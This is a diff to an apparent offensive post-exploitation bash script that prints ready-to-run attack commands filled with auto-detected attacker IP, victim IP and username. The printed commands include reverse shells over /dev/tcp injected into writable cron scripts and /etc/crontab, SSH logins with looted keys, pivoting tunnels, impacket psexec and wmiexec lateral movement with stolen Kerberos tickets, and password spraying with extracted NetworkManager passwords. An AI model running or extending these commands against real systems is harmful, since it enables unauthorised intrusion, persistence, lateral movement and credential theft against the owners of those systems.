@@ -123,6 +123,7 @@ usage() {
 QUICK_MODE=false
 SINGLE_PHASE=""
 LOOT_ROOT="./loot"
+KALI_IP=""
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -134,6 +135,9 @@ while [[ $# -gt 0 ]]; do
         --phase)
             [[ $# -lt 2 ]] && { error "--phase requires an argument"; exit 1; }
             SINGLE_PHASE="$2"; shift 2 ;;
+        --kali-ip)
+            [[ $# -lt 2 ]] && { error "--kali-ip requires an argument"; exit 1; }
+            KALI_IP="$2"; shift 2 ;;
         --no-color)
             disable_colors; shift ;;
         --help|-h)
@@ -144,6 +148,18 @@ while [[ $# -gt 0 ]]; do
             exit 1 ;;
     esac
 done
+
+# Detect Kali IP from the SSH session (SSH_CLIENT is set by sshd automatically).
+# Falls back to the explicit --kali-ip arg if provided, or a placeholder.
+[[ -z "$KALI_IP" ]] && KALI_IP=$(awk '{print $1}' <<< "${SSH_CLIENT:-}" 2>/dev/null || true)
+KALI_IP="${KALI_IP:-<KALI_IP>}"
+
+# Detect this host's own IP from the SSH server-side connection info, then hostname -I.
+THIS_HOST_IP=$(awk '{print $3}' <<< "${SSH_CONNECTION:-}" 2>/dev/null || true)
+[[ -z "$THIS_HOST_IP" ]] && THIS_HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+THIS_HOST_IP="${THIS_HOST_IP:-<THIS_HOST_IP>}"
+
+CUR_USER=$(id -un 2>/dev/null || whoami 2>/dev/null || echo '<USER>')
 
 #==============================================================================
 # SETUP OUTPUT DIRECTORIES
@@ -694,11 +710,11 @@ generate_attack_commands() {
             echo "------------------------------------------------------------"
             echo "chmod 600 ${kf}"
             if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
-                awk -F: '$3 >= 1000 && $3 < 65534 {print "ssh -i '"${kf}"' "$1"@<TARGET_IP>"}' \
+                awk -F: '$3 >= 1000 && $3 < 65534 {print "ssh -i '"${kf}"' "$1"@'"${THIS_HOST_IP}"'"}' \
                     "${OUTDIR}/creds/passwd.txt" 2>/dev/null | head -5
             fi
-            echo "ssh -i ${kf} root@<TARGET_IP>"
-            echo "ssh -i ${kf} <USERNAME>@<TARGET_IP>"
+            echo "ssh -i ${kf} root@${THIS_HOST_IP}"
+            echo "ssh -i ${kf} ${CUR_USER}@${THIS_HOST_IP}"
             echo ""
         done
 
@@ -713,8 +729,8 @@ generate_attack_commands() {
                 port=$(echo "${line}" | grep -oP '127[.:][0-9.]+[:%]\K[0-9]+' | head -1)
                 [[ -z "${port}" ]] && continue
                 echo "# Port ${port} (internal only):"
-                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<THIS_HOST_IP>"
-                echo "# OR: ./pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip <THIS_HOST_IP>"
+                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} ${CUR_USER}@${THIS_HOST_IP}"
+                echo "# OR: ./pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip ${THIS_HOST_IP}"
                 echo "# Then connect: <tool> 127.0.0.1 ${port}"
                 echo ""
             done < "${OUTDIR}/network/internal_listeners.txt"
@@ -873,13 +889,13 @@ generate_attack_commands() {
                 echo "cat ${OUTDIR}/files/cron_jobs.txt"
                 echo ""
                 echo "# 2. If a cron script path is writable, inject reverse shell:"
-                echo "echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /path/to/writable/cron_script.sh"
+                echo "echo 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1' >> /path/to/writable/cron_script.sh"
                 echo ""
                 echo "# 3. If /etc/crontab itself is writable:"
-                echo "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\"' >> /etc/crontab"
+                echo "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"' >> /etc/crontab"
                 echo ""
-                echo "# 4. Listener on Kali:"
-                echo "nc -lvnp 4444"
+                echo "# 4. Catch shell on Kali (${KALI_IP}):"
+                echo "penelope -p 4444 -O"
                 echo ""
                 echo "# 5. Use pspy64 to catch jobs not in visible crontab:"
                 echo "./pspy64  # run in second session on target"
@@ -897,10 +913,10 @@ generate_attack_commands() {
                 [[ -z "${subnet}" ]] && continue
                 echo "# Subnet: ${subnet}"
                 echo "# On Kali — set up pivot first (use this host as pivot):"
-                echo "./pivotr.sh ligolo --subnet ${subnet} --serve"
-                echo "# OR: ./pivotr.sh ssh --type dynamic --pivot-ip <THIS_HOST_IP> --pivot-user <USER>"
+                echo "./pivotr.sh ligolo --pivot-ip ${THIS_HOST_IP} --subnet ${subnet} --serve"
+                echo "# OR: ./pivotr.sh ssh --type dynamic --pivot-ip ${THIS_HOST_IP} --pivot-user ${CUR_USER}"
                 echo "# Then scan internally:"
-                echo "sudo ./recon.sh --auto <INTERNAL_HOST_IP>"
+                echo "sudo ./recon.sh --auto <INTERNAL_HOST_IP>   # replace with a host from ${subnet}"
                 echo "# OR (SOCKS): proxychains sudo ./recon.sh --auto <INTERNAL_HOST_IP>"
                 echo ""
             done < "${OUTDIR}/network/reachable_subnets.txt"
@@ -929,12 +945,25 @@ generate_attack_commands() {
                 fi
                 echo ""
                 echo "# 3. Use ticket for lateral movement:"
-                echo "impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
-                echo "impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
-                echo "impacket-smbclient -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>"
+                # Try to extract domain, user, and DC FQDN from the klist output in kerberos.txt
+                local _krb_principal _krb_user _krb_domain _krb_fqdn
+                _krb_principal=$(grep -m1 'Principal:' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null \
+                    | grep -oP 'Principal:\s*\K\S+' || true)
+                _krb_user="${_krb_principal%%@*}"
+                _krb_domain=$(echo "${_krb_principal#*@}" | tr '[:upper:]' '[:lower:]')
+                _krb_fqdn=$(grep -m1 'host/' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null \
+                    | grep -oP 'host/\K[^@\s]+' || true)
+                _krb_user="${_krb_user:-<USER>}"
+                _krb_domain="${_krb_domain:-${OffSec_DOMAIN:-<DOMAIN>}}"
+                _krb_fqdn="${_krb_fqdn:-<DC_FQDN>}"
+                echo "impacket-psexec -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
+                echo "impacket-wmiexec -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
+                echo "impacket-smbclient -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
                 echo ""
                 echo "# 4. Convert to impacket format if needed:"
-                echo "impacket-ticketConverter krb5cc_<ID> ticket.ccache"
+                local _ccache_name
+                _ccache_name=$(basename "${ccache_line:-krb5cc_X}" 2>/dev/null)
+                echo "impacket-ticketConverter ${_ccache_name} ticket.ccache"
                 echo ""
             fi
         fi
@@ -1100,7 +1129,12 @@ generate_attack_commands() {
             echo "cat '${OUTDIR}/creds/networkmanager_creds.txt'"
             echo ""
             echo "# Feed plaintext passwords to sprayr.sh:"
-            echo "./sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
+            local _nm_pass
+            _nm_pass=$(grep -m1 'psk=\|^password=' "${OUTDIR}/creds/networkmanager_creds.txt" 2>/dev/null \
+                | cut -d= -f2 | tr -d '[:space:]' || true)
+            _nm_pass="${_nm_pass:-<FOUND_PASSWORD>}"
+            echo "./sprayr.sh -u '${CUR_USER}' -p '${_nm_pass}' -t ${THIS_HOST_IP}"
+            echo "./sprayr.sh --from-creds   # after adding to ${TOOLKIT_ROOT:-~/toolkit}/creds.txt"
             echo ""
         fi
 
